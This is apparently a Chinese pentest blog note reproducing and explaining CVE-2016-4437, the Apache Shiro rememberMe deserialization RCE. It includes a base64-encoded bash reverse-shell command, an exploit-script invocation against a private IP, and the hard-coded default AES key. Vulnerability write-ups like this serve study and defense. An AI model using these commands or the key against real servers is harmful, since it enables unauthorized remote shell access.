---
title: CVE-2016-4437
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-08T21:37:56+08:00
categories: 
- 渗透测试
- 漏洞复现
- shiro
---

## 漏洞复现

https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51

使用图形化工具能够很方便的检测和利用漏洞，该工具要求java环境为jdk1.8

或者是使用脚本进行shell反弹

```
bash -c {L2Jpbi9iYXNoIC1pID4mxxxxxxxxEzNS80NDQ0IDA+JjE=}|{base64 -d}{bash -i}
```

```
python2 -u http://192.168.121.xxx:8080 -p "bash -c bash-code" -t 3
```

监听即可拿到shell

或者使用其他工具写入内存码

![2016](E:\笔记软件\笔记\渗透测试\漏洞复现\shiro\2016.png)

## 漏洞分析

Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。该漏洞的根源在于硬编码Key。

在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。

通过请求包和返回包，我们可以初步识别该漏洞

![2016-2](E:\笔记软件\笔记\渗透测试\漏洞复现\shiro\2016-2.jpg)

```java
private static final Logger log = LoggerFactory.getLogger(AbstractRememberMeManager.class);


/**
 * The following Base64 string was generated by auto-generating an AES Key:
 * <pre>
 * AesCipherService aes = new AesCipherService();
 * byte[] key = aes.generateNewKey().getEncoded();
 * String base64 = Base64.encodeToString(key);
 * </pre>
 * The value of 'base64' was copied-n-pasted here:
 */
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

相较于1.2.5,1.2.4的key直接硬编码在源码中，可以直接从代码中看到